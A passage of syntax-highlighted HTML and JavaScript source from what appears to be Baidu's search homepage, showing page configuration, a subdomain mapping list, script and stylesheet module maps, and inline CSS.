"",</span><br><span class="line">            pinyin : "",</span><br><span class="line">            favoOn : "",</span><br><span class="line">            userAgent : "G3WLAN",</span><br><span class="line">                        curResultNum:"0",</span><br><span class="line">            rightResultExist:false,</span><br><span class="line">            protectNum:0,</span><br><span class="line">            zxlNum:0,</span><br><span class="line">            pageNum:1,</span><br><span class="line">            pageSize:10,</span><br><span class="line">            newindex:0,</span><br><span class="line">            async:2,</span><br><span class="line">            maxPreloadThread:5,</span><br><span class="line">            maxPreloadTimes:10,</span><br><span class="line">            preloadMouseMoveDistance:5,</span><br><span class="line">            switchAddMask:false,</span><br><span class="line">            isDebug:false,</span><br><span class="line">            ishome : 1,</span><br><span class="line">            flagTranslateResult:0,</span><br><span class="line">            globalLogFlag:0</span><br><span class="line">        ,encTn:'e358ZG0z1srwJDl\/Ygz8oT3CELKA1f6hl3YzBaGVY61Mo6\/Mu8j5P2CJuN0'        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">    var name,navigate,al_arr=[];</span><br><span class="line">    var selfOpen = window.open;eval("var open = selfOpen;");</span><br><span class="line">    var isIE=navigator.userAgent.indexOf("MSIE")!=-1&amp;&amp;!window.opera;</span><br><span class="line">    var E = bds.ecom= &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    bds.se.mon = &#123;'loadedItems':[],'load':function()&#123;&#125;,'srvt':-1&#125;;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        bds.se.mon.srvt = parseInt(document.cookie.match(new RegExp("(^| )BDSVRTM=([^;]*)(;|$)"))[2]);</span><br><span class="line">        document.cookie="BDSVRTM=;expires=Sat, 01 Jan 2000 00:00:00 GMT";</span><br><span class="line">    &#125;catch(e)&#123;&#125;</span><br><span class="line">    var</span><br><span class="line">    bdUser        = bds.comm.user?bds.comm.user:null,</span><br><span class="line">    bdQuery       = bds.comm.query,</span><br><span class="line">    bdUseFavo     = bds.comm.useFavo,</span><br><span class="line">    bdFavoOn      = bds.comm.favoOn,</span><br><span class="line">    bdCid         = bds.comm.cid,</span><br><span class="line">    bdSid         = bds.comm.sid,</span><br><span class="line">    bdServerTime  = bds.comm.serverTime,</span><br><span class="line">    bdQid         = bds.comm.queryId,</span><br><span class="line">    bdstoken      = bds.comm.stoken,</span><br><span class="line">    login_success = [];</span><br><span class="line"></span><br><span class="line">            var s_domain=&#123;"protocol":"http:","staticUrl":"http://ss.bdimg.com/","base":"home","baseuri":"/home","passconf":"http://passport.baidu.com/ubrwsbas","logout":"https://passport.baidu.com/?logout&amp;u=","bs":"http://www.baidu.com","login":"http://passport.baidu.com/?login&amp;tpl=super&amp;u=","sp":"http://hi.baidu.com/"&#125;;</span><br><span class="line">    s_session=&#123;"logId":"3541275485","seqId":"3541275672","sessionId":"","debug":false,"userTips":"&#123;&#125;","curmod":"2","firstmod":"","logoCode":false,"isFesLogo":false,"sid":"30968_1427_21084_30997_30824_30717","mSid":"","sample_value":"","isLogin":false,&#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">bds.util.domain = (function()&#123;</span><br><span class="line">        																					            																							<span class="attribute">var list = &#123;</span></span><br><span class="line"><span class="attribute">        "graph.baidu.com"</span>: "http://graph<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"p<span class="variable">.qiao</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://p<span class="variable">.qiao</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"vse<span class="variable">.baidu</span><span class="variable">.com</span>":"http://vse<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"hdpreload<span class="variable">.baidu</span><span class="variable">.com</span>":"http://hdpreload<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"lcr<span class="variable">.open</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://lcr<span class="variable">.open</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"kankan<span class="variable">.baidu</span><span class="variable">.com</span>":"http://kankan<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"xapp<span class="variable">.baidu</span><span class="variable">.com</span>":"http://xapp<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"dr<span class="variable">.dh</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://dr<span class="variable">.dh</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"xiaodu<span class="variable">.baidu</span><span class="variable">.com</span>":"http://xiaodu<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"sensearch<span class="variable">.baidu</span><span class="variable">.com</span>":"http://sensearch<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"s1<span class="variable">.bdstatic</span><span class="variable">.com</span>":"http://s1<span class="variable">.bdstatic</span><span class="variable">.com</span>",</span><br><span class="line">		"olime<span class="variable">.baidu</span><span class="variable">.com</span>":"http://olime<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"app<span class="variable">.baidu</span><span class="variable">.com</span>":"http://app<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"i<span class="variable">.baidu</span><span class="variable">.com</span>":"http://i<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"c<span class="variable">.baidu</span><span class="variable">.com</span>":"http://c<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"sclick<span class="variable">.baidu</span><span class="variable">.com</span>":"http://sclick<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"nsclick<span class="variable">.baidu</span><span class="variable">.com</span>":"http://nsclick<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"sestat<span class="variable">.baidu</span><span class="variable">.com</span>":"http://sestat<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"eclick<span class="variable">.baidu</span><span class="variable">.com</span>":"http://eclick<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"api<span class="variable">.map</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://api<span class="variable">.map</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"ecma<span class="variable">.bdimg</span><span class="variable">.com</span>":"http://ecma<span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">		"ecmb<span class="variable">.bdimg</span><span class="variable">.com</span>":"http://ecmb<span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "t1<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t1<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">        "t2<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t2<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">        "t3<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t3<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"t10<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t10<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"t11<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t11<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"t12<span class="variable">.baidu</span><span class="variable">.com</span>":"http://t12<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"i7<span class="variable">.baidu</span><span class="variable">.com</span>":"http://i7<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"i8<span class="variable">.baidu</span><span class="variable">.com</span>":"http://i8<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"i9<span class="variable">.baidu</span><span class="variable">.com</span>":"http://i9<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"b1<span class="variable">.bdstatic</span><span class="variable">.com</span>":"http://b1<span class="variable">.bdstatic</span><span class="variable">.com</span>",</span><br><span class="line">		"ss<span class="variable">.bdimg</span><span class="variable">.com</span>":"http://ss<span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">		"opendata<span class="variable">.baidu</span><span class="variable">.com</span>":"http://opendata<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"api<span class="variable">.open</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://api<span class="variable">.open</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"tag<span class="variable">.baidu</span><span class="variable">.com</span>":"http://tag<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"f3<span class="variable">.baidu</span><span class="variable">.com</span>":"http://f3<span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">		"s<span class="variable">.share</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://s<span class="variable">.share</span><span class="variable">.baidu</span><span class="variable">.com</span>",	</span><br><span class="line">		"bdimg<span class="variable">.share</span><span class="variable">.baidu</span><span class="variable">.com</span>":"http://bdimg<span class="variable">.share</span><span class="variable">.baidu</span><span class="variable">.com</span>",</span><br><span class="line">        "1<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://1<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "2<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://2<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "3<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://3<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "4<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://4<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "5<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://5<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "6<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://6<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "7<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://7<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>",</span><br><span class="line">        "8<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>":"http://8<span class="variable">.su</span><span class="variable">.bdimg</span><span class="variable">.com</span>"</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">var get = function(url) &#123;</span></span><br><span class="line"><span class="attribute">        if(location.protocol === "http") &#123;</span></span><br><span class="line"><span class="attribute">            return url;</span></span><br><span class="line"><span class="attribute">        &#125;</span></span><br><span class="line"><span class="attribute">        var reg = /^(http[s]?</span>:\/\/)?([^\/]+)(.*)/,</span><br><span class="line">        matches = url<span class="variable">.match</span>(reg);</span><br><span class="line">        <span class="attribute">url = list.hasOwnProperty(matches[2])&amp;&amp;(list[matches[2]] + matches[3]) || url;</span></span><br><span class="line"><span class="attribute">        return url;</span></span><br><span class="line"><span class="attribute">    &#125;,</span></span><br><span class="line"><span class="attribute">    set = function(kdomain,vdomain) &#123;</span></span><br><span class="line"><span class="attribute">        list[kdomain] = vdomain;</span></span><br><span class="line"><span class="attribute">    &#125;;</span></span><br><span class="line"><span class="attribute">    return &#123;</span></span><br><span class="line"><span class="attribute">        get</span> : get,</span><br><span class="line">        set : set</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/<span class="attribute">script&gt;    &lt;script&gt;</span></span><br><span class="line"><span class="attribute">    setTimeout(function()&#123;</span></span><br><span class="line"><span class="attribute">        try&#123;</span></span><br><span class="line"><span class="attribute">            var kw=document.getElementById("kw");</span></span><br><span class="line"><span class="attribute">            kw.focus();</span></span><br><span class="line"><span class="attribute">            kw.parentNode.className="bg s_ipt_wr iptfocus quickdelete-wrap";</span></span><br><span class="line"><span class="attribute">        &#125;catch(e)&#123;&#125;</span></span><br><span class="line"><span class="attribute">    &#125;,0);</span></span><br><span class="line"><span class="attribute">    &lt;/script&gt;</span></span><br><span class="line"><span class="attribute">    &lt;script type="text/javascript" src="http</span>://ss<span class="variable">.bdimg</span><span class="variable">.com</span>/static/superman/js/lib/jquery-1-cc52697ab1.10.2<span class="variable">.js</span>"&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type="text/javascript" src="http://ss<span class="variable">.bdimg</span><span class="variable">.com</span>/static/superman/js/sbase-479dfc1f39<span class="variable">.js</span>"&gt;&lt;/script&gt;</span><br><span class="line">&lt;style type="text/css"&gt;<span class="variable">.sui-scrollbar-container</span>&#123;position:relative;<span class="attribute">overflow</span>:hidden&#125;<span class="variable">.sui-scrollbar-bar</span>&#123;border-left:1px solid #E1E1E1;<span class="attribute">border-right</span>:1px solid #E3E3E3;<span class="attribute">border-top</span>:1px solid #E3E3E3;<span class="attribute">border-bottom</span>:1px solid #E3E3E3;<span class="attribute">background</span>:#E3E3E3;<span class="attribute">width</span>:7px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:0;<span class="attribute">right</span>:0;<span class="attribute">height</span>:100%;<span class="attribute">cursor</span>:pointer&#125;<span class="variable">.sui-scrollbar-slider</span>&#123;border:1px solid #E1E1E1;<span class="attribute">background</span>:#fff;<span class="attribute">width</span>:100%;<span class="attribute">left</span>:-1px;<span class="attribute">position</span>:absolute;<span class="attribute">cursor</span>:pointer&#125;&lt;/style&gt;&lt;script type="text/javascript"&gt;F<span class="variable">._setMod</span>("superui");<span class="attribute">F._fileMap(&#123;"/js/ubase_5a7b0933.js"</span>:["superui","util/tool","util/emitter","util/dot","util/smDot","component","component/draggable","component/scrollbar","component/dialog","component/tips","component/share","component/share2","component/notify","component/suggestion","component/placeholder"],"/js/ubase_unused_addca7b6<span class="variable">.js</span>":["component/draggsort","component/draggselect","component/draggdirs"],"/css/ubase_9376fdcf<span class="variable">.css</span>":["superui<span class="variable">.css</span>","dialog<span class="variable">.css</span>","tips<span class="variable">.css</span>","share<span class="variable">.css</span>","scrollbar<span class="variable">.css</span>","suggestion<span class="variable">.css</span>"],"/css/ubase_sync_ac0620ef<span class="variable">.css</span>":["scrollbar_sync<span class="variable">.css</span>"],"/js/utils_65f6f1b7<span class="variable">.js</span>":["util/pubsub"]&#125;);&lt;/<span class="attribute">script&gt;&lt;script&gt;F._setMod("superman");F._fileMap(&#123;"/js/sbase-479dfc1f39.js"</span>:["plugin/browser","plugin/strpx","plugin/url","plugin/ajax","plugin/load_file","plugin/string","plugin/stringify","plugin/localstorage","plugin/fn","plugin/easing","plugin/mousewheel","plugin/cookie","lib/base","lib/sbase","lib/class","lib/mod_evt","lib/log","lib/thunder","common/user_attr","common/select","common/bottom_layer"],"/js/min_super-6caf46858f<span class="variable">.js</span>":["common/result_page","common/image_lazy_load","log/webb<span class="variable">.min</span>","log/super_all",</span><br><span class="line">"lib/xpath_log","lib/carditem_log","ps/log","ps/sindex","ps/sug","ps/fpid","page/analyse","start/super_start","page/info","page/scroll","guide/superman_guide"],"/js/supermin-cbd8f087ab<span class="variable">.js</span>":["lib/base","lib/sbase","lib/log","lib/class","lib/mod_evt","plugin/browser","plugin/url","log/super_all","ps/supermin_log","ps/s_supermin","ps/sug","page/info","start/supermin_start"],"/js/super_ext-4442fe3f54<span class="variable">.js</span>":["plugin/mousewheel","weather/setting_refresh","weather/setting_ctrl","weather/setting_view",</span><br><span class="line">"weather/weather_city"],"/js/super_load-2aa20826e0<span class="variable">.js</span>":["weather/weather_tpl","weather/weather_ctrl","weather/weather_autorefresh","start/skin_start","skin/skin_rewrite","mngr/top_layer","mngr/top_menunav","mngr/top_menu","common/guide_tip","guide/groupbuy_tip","guide/new_card_tip","guide/wenjuan_tip","page/page_exp"],"/js/skin_layer-d86e1dbb09<span class="variable">.js</span>":["skin/skin_init","skin/skin_cut_img","skin/skin_model","skin/skin_nav","skin/skin_page","skin/skin_tools","skin/skin_img","skin/skin_control",</span><br><span class="line">"skin/skin_view","skin/skin_new_upload","skin/skin_setting","skin/skin_preview","skin/skin_defined","skin/skin_opacity","skin/skin_ajax","skin/skin_extra","skin/skin_random","skin/skin_cartoonExtra"],"/js/opacity_mod-57b92b76b5<span class="variable">.js</span>":["opacity/opacity_tpl","opacity/opacity_action","opacity/opacity_conf"],"/js/min_setting-f23f41eac7<span class="variable">.js</span>":["setting/setting_constructor","start/setting_start","setting/mod_drag","setting/setting_action"],"/js/card_setting_min-6d046760ed<span class="variable">.js</span>":["setting/card_setting"],</span><br><span class="line">"/js/page_setting-e3c279d713<span class="variable">.js</span>":["log/super_all","setting/page_setting","setting/tab_msg","start/page_setting_start","common/pop","setting/yaohao","msg/const","setting/data_adapter","msg/bind","msg/bind_window","setting/common_setting"],"/js/min_mt-3df544d11c<span class="variable">.js</span>":["msg/const","msg/data_server","msg/data_adapter"],"/js/mt_ext-4eee81afe1<span class="variable">.js</span>":["msg/index_nav_msg_extend","msg/msg_builder","msg/bind","msg/bind_window"],"/js/min_notice-816c20c940<span class="variable">.js</span>":["mt/mt_show","mt/mt_msg_constructor"],</span><br><span class="line">"/js/notice_ext-0bfec0da78<span class="variable">.js</span>":["mt/mt_ext","mt/mt_msg_item","mt/mt_msg_operate"],"/js/guide_ie-0087c48e5f<span class="variable">.js</span>":["guide/main_guide_ie"],"/js/guide-441fd71dfd<span class="variable">.js</span>":["guide/main_guide","guide/navns_guide","guide/conrecommend_guide"],"/js/ps/ishttps-8b74cccb13<span class="variable">.js</span>":["ps/ishttps"],"/js/lib/exception-13bf584742<span class="variable">.js</span>":["lib/exception"],"/js/lib/jquery-1-cc52697ab1.10.2<span class="variable">.js</span>":["lib/jquery-1.10.2"],"/js/ps/yc-4c3e9b9cb3<span class="variable">.js</span>":["ps/yc"],"/css/super_ext-574d83f5e3<span class="variable">.css</span>":["weather_setting<span class="variable">.css</span>","new_card_tip<span class="variable">.css</span>",</span><br><span class="line">"mngr_quit_guid<span class="variable">.css</span>","wenjuan_tip<span class="variable">.css</span>"],"/css/super_min-2975a03c7d<span class="variable">.css</span>":["super_init<span class="variable">.css</span>","weather<span class="variable">.css</span>","top_menu<span class="variable">.css</span>","skin<span class="variable">.css</span>","super_skin<span class="variable">.css</span>","select<span class="variable">.css</span>","index_guide<span class="variable">.css</span>"],"/css/bottom_layer-a8fdba3759<span class="variable">.css</span>":["bottom_layer<span class="variable">.css</span>"],"/css/skin_layer-eb2e8a2c1b<span class="variable">.css</span>":["skin_layer<span class="variable">.css</span>","skin_lottery<span class="variable">.css</span>"],"/css/guidetip-b41ed60c8a<span class="variable">.css</span>":["guide<span class="variable">.css</span>"],"/css/nsguide-a66438b784<span class="variable">.css</span>":["ns_guide<span class="variable">.css</span>"],"/css/setting_min-4dae12391e<span class="variable">.css</span>":["setting<span class="variable">.css</span>"],"/css/card_setting-673b2943c1<span class="variable">.css</span>":[</span><br><span class="line">"card_setting<span class="variable">.css</span>"],"/css/page_setting-da9f239ab9<span class="variable">.css</span>":["super_setting<span class="variable">.css</span>","select<span class="variable">.css</span>","setting_msg<span class="variable">.css</span>","setting_yaohao<span class="variable">.css</span>","pop<span class="variable">.css</span>","dialog<span class="variable">.css</span>"],"/css/mt_min-88763bc1c9<span class="variable">.css</span>":["mt_mod<span class="variable">.css</span>","index_msg<span class="variable">.css</span>"],"/css/skin_opacity0-25d3b878a5<span class="variable">.css</span>":["skin_opacity0<span class="variable">.css</span>"],"/css/skin_opacity5-94753c7689<span class="variable">.css</span>":["skin_opacity5<span class="variable">.css</span>"],"/css/skin_opacity10-6adcf5049d<span class="variable">.css</span>":["skin_opacity10<span class="variable">.css</span>"],"/css/skin_opacity15-b7f3ce25b1<span class="variable">.css</span>":["skin_opacity15<span class="variable">.css</span>"],"/css/skin_opacity20-01ceb53868<span class="variable">.css</span>":[</span><br><span class="line">"skin_opacity20<span class="variable">.css</span>"],"/css/skin_opacity25-eb9f2aa434<span class="variable">.css</span>":["skin_opacity25<span class="variable">.css</span>"],"/css/skin_opacity30-14c391374a<span class="variable">.css</span>":["skin_opacity30<span class="variable">.css</span>"],"/css/skin_opacity35-24f6243bad<span class="variable">.css</span>":["skin_opacity35<span class="variable">.css</span>"],"/css/skin_opacity40-8048c72546<span class="variable">.css</span>":["skin_opacity40<span class="variable">.css</span>"],"/css/skin_opacity45-a3b47f9776<span class="variable">.css</span>":["skin_opacity45<span class="variable">.css</span>"],"/css/skin_opacity50-0642d3a803<span class="variable">.css</span>":["skin_opacity50<span class="variable">.css</span>"],"/css/skin_opacity55-c15ec2efe2<span class="variable">.css</span>":["skin_opacity55<span class="variable">.css</span>"],"/css/skin_opacity60-5c3ec10d49<span class="variable">.css</span>":["skin_opacity60<span class="variable">.css</span>"</span><br><span class="line">],"/css/skin_opacity65-60c8c9d6c4<span class="variable">.css</span>":["skin_opacity65<span class="variable">.css</span>"],"/css/skin_opacity70-f4fab377bf<span class="variable">.css</span>":["skin_opacity70<span class="variable">.css</span>"],"/css/skin_opacity75-7b98e2427b<span class="variable">.css</span>":["skin_opacity75<span class="variable">.css</span>"],"/css/skin_opacity80-b694ab2cb7<span class="variable">.css</span>":["skin_opacity80<span class="variable">.css</span>"],"/css/skin_opacity85-5d99d4c219<span class="variable">.css</span>":["skin_opacity85<span class="variable">.css</span>"],"/css/skin_opacity90-766eb80c75<span class="variable">.css</span>":["skin_opacity90<span class="variable">.css</span>"],"/css/skin_opacity95-37f2a69285<span class="variable">.css</span>":["skin_opacity95<span class="variable">.css</span>"],"/css/skin_opacity100-c4c54915f8<span class="variable">.css</span>":["skin_opacity100<span class="variable">.css</span>"],</span><br><span class="line">"/css/tutorial-64cb00f322<span class="variable">.css</span>":["tutorial<span class="variable">.css</span>"],"/css/head-bd9974b7ec<span class="variable">.css</span>":["s_top_wrap<span class="variable">.css</span>","head_wrapper<span class="variable">.css</span>"],"/css/sam_searchbox_head-6c314c6bc9<span class="variable">.css</span>":["s_top_wrap_new<span class="variable">.css</span>","components/head_wrapper_new<span class="variable">.css</span>"],"/css/pages/index-5af809217b<span class="variable">.css</span>":["pages/index<span class="variable">.css</span>","grid/grid<span class="variable">.css</span>"],"/css/pages/index_result-6cd495e677<span class="variable">.css</span>":["pages/index_result<span class="variable">.css</span>"],"/css/pages/result-289674bd83<span class="variable">.css</span>":["pages/result<span class="variable">.css</span>"],"/css/pages/ps-a44e285e33<span class="variable">.css</span>":["pages/ps<span class="variable">.css</span>","grid/grid<span class="variable">.css</span>"],</span><br><span class="line">"/css/components/qrcode-492c8fcd1d<span class="variable">.css</span>":["components/qrcode<span class="variable">.css</span>"]&#125;);<span class="attribute">window._xman_speed=window._xman_speed||&#123;&#125;;F._setContext(&#123;base</span>:"lib/sbase"&#125;);<span class="attribute">F.use("lib/mod_evt",function(evt)&#123;F._setContextMethod("fire",function(evtName,evtArgs)&#123;return evt.fire(this.svnMod+"</span>:"+this<span class="variable">.modName</span>,evtName,evtArgs)&#125;);<span class="attribute">F._setContextMethod("listen",function(modName,evtName,handler)&#123;var mType=Object.prototype.toString.call(modName);if(mType=="[object String]")&#123;if(modName.indexOf("</span>:")&lt;0)&#123;modName=this<span class="variable">.svnMod</span>+":"+modName&#125;</span><br><span class="line">&#125;else if(mType=="[object Array]")&#123;for(var i=0,len=modName<span class="variable">.length</span>;<span class="attribute">i&lt;len;i++)&#123;if(modName[i].indexOf("</span>:")&lt;0)&#123;modName[i]=this<span class="variable">.svnMod</span>+":"+modName[i]&#125;&#125;&#125;evt<span class="variable">.on</span>(modName,evtName,handler)&#125;);<span class="attribute">F._setContextMethod("unListen",function(modName,evtName,handler)&#123;evt.un(this.svnMod+"</span>:"+this<span class="variable">.modName</span>,evtName,handler)&#125;)&#125;);<span class="attribute">F._loadScriptTimeout=15e3;F._useConfig=true;F._firstScreenCSS=F._firstScreenCSS||[];F._firstScreenCSS.push("/css/super_min-2975a03c7d.css");F._firstScreenJS=F._firstScreenJS||[]</span></span><br><span class="line"><span class="attribute">;F._firstScreenJS.push("/js/min_super-6caf46858f.js");&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">&lt;script&gt;</span></span><br><span class="line"><span class="attribute">$(window).on("load", function() &#123;</span></span><br><span class="line"><span class="attribute">    var e = $('#virus-2020');</span></span><br><span class="line"><span class="attribute">    e.click(function() &#123;</span></span><br><span class="line"><span class="attribute">        $.setCookie('virus-2020-clicked', '1');</span></span><br><span class="line"><span class="attribute">        e.removeClass('dot');</span></span><br><span class="line"><span class="attribute">    &#125;);</span></span><br><span class="line"><span class="attribute">    var hasClicked = $.getCookie('virus-2020-clicked');</span></span><br><span class="line"><span class="attribute">    if (!hasClicked) &#123;</span></span><br><span class="line"><span class="attribute">        e.addClass('dot');</span></span><br><span class="line"><span class="attribute">    &#125;</span></span><br><span class="line"><span class="attribute">&#125;);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">    </span></span><br><span class="line"><span class="attribute">    &lt;script&gt;</span></span><br><span class="line"><span class="attribute">    (function()&#123;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">        var result_common_css = "    \n        &lt;style data-for=\"result\" id=\"css_result\" type=\"text\/css\"&gt;body&#123;color</span>:#333;<span class="attribute">background</span>:#fff;<span class="attribute">padding</span>:6px 0 0;<span class="attribute">margin</span>:0;<span class="attribute">position</span>:relative;<span class="attribute">min-width</span>:900px&#125;\n<span class="variable">.p</span>1,<span class="variable">.p</span>2,body,td,th&#123;font-family:arial&#125;\ndd,dl,dt,form,h3,li,ol,p,ul&#123;margin:0;<span class="attribute">padding</span>:0;<span class="attribute">list-style</span>:none&#125;\ninput&#123;padding-top:0;<span class="attribute">padding-bottom</span>:0;<span class="attribute">-moz-box-sizing</span>:border-box;<span class="attribute">-webkit-box-sizing</span>:border-box;<span class="attribute">box-sizing</span>:border-box&#125;\nimg,table&#123;border:0&#125;\ntd&#123;font-size:9pt;<span class="attribute">line-height</span>:18px&#125;\nem&#123;font-style:normal;<span class="attribute">color</span>:#c00&#125;\na em&#123;text-decoration:underline&#125;\ncite&#123;font-style:normal;<span class="attribute">color</span>:green&#125;\n<span class="variable">.m</span>,a<span class="variable">.m</span>&#123;color:#666&#125;\na<span class="variable">.m</span>:visited&#123;color:#606&#125;\n<span class="variable">.g</span>,a<span class="variable">.g</span>&#123;color:green&#125;\n<span class="variable">.c</span>&#123;color:#77c&#125;\n<span class="variable">.f</span>14&#123;font-size:14px&#125;\n<span class="variable">.f</span>10&#123;font-size:10.5pt&#125;\n<span class="variable">.f</span>16&#123;font-size:16px&#125;\n<span class="variable">.f</span>13&#123;font-size:13px&#125;\n<span class="variable">.bg</span>&#123;background-image:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/icons_5859e57<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>);<span class="attribute">_background-image</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/icons_d5b04cc<span class="variable">.gif</span>?v=62527263<span class="variable">.gif</span>);<span class="attribute">background-repeat</span>:no-repeat&#125;\n#foot,#head,#search,#tool,#u&#123;font-size:12px&#125;\n<span class="variable">.logo</span>&#123;width:117px;<span class="attribute">height</span>:38px;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.p</span>1&#123;line-height:120%;<span class="attribute">margin-left</span>:-12pt&#125;\n<span class="variable">.p</span>2&#123;width:100%;<span class="attribute">line-height</span>:120%;<span class="attribute">margin-left</span>:-12pt&#125;\n#wrapper&#123;_zoom:1&#125;\n#container&#123;word-break:break-all;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.container_s</span>&#123;width:1002px&#125;\n<span class="variable">.container_l</span>&#123;width:1222px&#125;\n#content_left&#123;width:636px;<span class="attribute">float</span>:left;<span class="attribute">padding-left</span>:35px&#125;\n#content_right&#123;border-left:1px solid #e1e1e1;<span class="attribute">float</span>:right&#125;\n<span class="variable">.container_s</span> #content_right&#123;width:271px&#125;\n<span class="variable">.container_l</span> #content_right&#123;width:434px&#125;\n<span class="variable">.content_none</span>&#123;padding-left:35px&#125;\n#u&#123;color:#999;<span class="attribute">white-space</span>:nowrap;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:10px;<span class="attribute">top</span>:4px;<span class="attribute">z-index</span>:299&#125;\n#u a&#123;color:#00c;<span class="attribute">margin</span>:0 5px&#125;\n#u <span class="variable">.reg</span>&#123;margin:0&#125;\n#u <span class="variable">.last</span>&#123;margin-right:0&#125;\n#u <span class="variable">.un</span>&#123;font-weight:700;<span class="attribute">margin-right</span>:5px&#125;\n#u ul&#123;width:100%;<span class="attribute">background</span>:#fff;<span class="attribute">border</span>:1px solid #9b9b9b&#125;\n#u li&#123;height:25px&#125;\n#u li a&#123;width:100%;<span class="attribute">height</span>:25px;<span class="attribute">line-height</span>:25px;<span class="attribute">display</span>:block;<span class="attribute">text-align</span>:left;<span class="attribute">text-decoration</span>:none;<span class="attribute">text-indent</span>:6px;<span class="attribute">margin</span>:0;<span class="attribute">filter</span>:none\\9&#125;\n#u li a:hover&#123;background:#ebebeb&#125;\n#u li<span class="variable">.nl</span>&#123;border-top:1px solid 